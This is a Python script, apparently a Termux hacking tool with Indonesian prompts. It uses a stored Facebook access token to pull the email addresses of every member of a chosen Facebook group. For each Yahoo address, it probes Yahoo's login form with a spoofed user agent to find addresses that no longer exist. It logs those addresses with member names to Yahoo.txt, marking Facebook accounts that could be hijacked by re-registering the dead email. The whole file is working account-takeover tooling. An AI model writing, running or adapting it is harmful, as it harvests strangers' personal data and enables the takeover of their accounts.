# -*- coding: utf-8 -*-
import sys
from login import logo
sys.path.insert (0, "..")
from warna import *


jumlah = 0
jml = []
berhasil = []
logo()
toket = open ("Token.txt", "r").read()
id = raw_input (u +"›"+ k +" Id Grup  "+ n +": ")
try:
	namaa = json.loads (get ("https://graph.facebook.com/group/?id="+ id +"&access_token="+ toket).text)
	print h +"✔ Email Anggota Grup "+ namaa["name"]
	jl = json.loads (get ("https://graph.facebook.com/"+ id +"/members?fields=name,id&limit=999999999&access_token="+ toket).text)
	o = open ("/data/data/com.termux/files/home/storage/shared/Yahoo.txt", "a")
	for i in jl["data"]:
		jumlah += 1
		jml.append (jumlah)
		nama = i["name"]
		jll = json.loads (get ("https://graph.facebook.com/"+ i["id"] +"?access_token="+ toket).text)
		try:
			email = jll["email"]
			yahoo = re.compile (r'@.*')
			yahooo = yahoo.search(email).group()
			if "yahoo.com" in yahooo:
				br = Browser()
				br.set_handle_robots(False)
				br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
				br.addheaders = [("User-Agent", "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16")]
				br.open ("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = email
				klik = br.submit().read()
				rc = re.compile (r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					rcc = rc.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in rcc:
					print h +"\r✔ "+ email + u +" => "+ n + nama +"   ",
					o.write (email +" => "+ nama +"\n")
					berhasil.append (email)
		except KeyError:
			pass
	o.close ()
	print n +"\r"+ 52* " ",
	print u +"\r• "+ k +"Jumlah Email Yahoo "+ n +": "+ h + str(len(berhasil))
	print h +"✔ "+ k +"Hasilnya Tersimpan Di Memori Internal"
	print b +"  Dengan Nama "+ h + tebal +"Yahoo.txt"+ n
	enter()
except KeyError:
	print m + tebal +"✘ Id Grup Tidak Ditemukan"+ n
	sleep (5)